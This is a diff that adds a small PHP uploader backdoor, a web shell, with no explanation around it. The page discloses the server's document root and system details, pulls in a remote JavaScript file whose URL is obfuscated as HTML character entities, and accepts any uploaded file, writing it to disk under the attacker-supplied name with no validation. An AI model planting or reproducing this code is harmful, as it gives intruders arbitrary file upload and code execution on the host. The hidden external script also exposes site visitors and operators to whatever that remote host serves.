@@ -1,0 +1,10 @@
+<?php
+echo "<title>Upload</title><b>Upload  </br><SCRIPT SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>".$_SERVER['DOCUMENT_ROOT']."</br>".php_uname();   
+$cwd = getcwd(); 
+Echo '<center> </b> <form method="post" target="_self" enctype="multipart/form-data">  
+<input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  
+</form>  </center></td></tr> </table><br>'; 
+if (!empty ($_FILES['uploads'])) {     
+    move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     
+    Echo "<b>Uploaded !!!<br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ; 
+?>
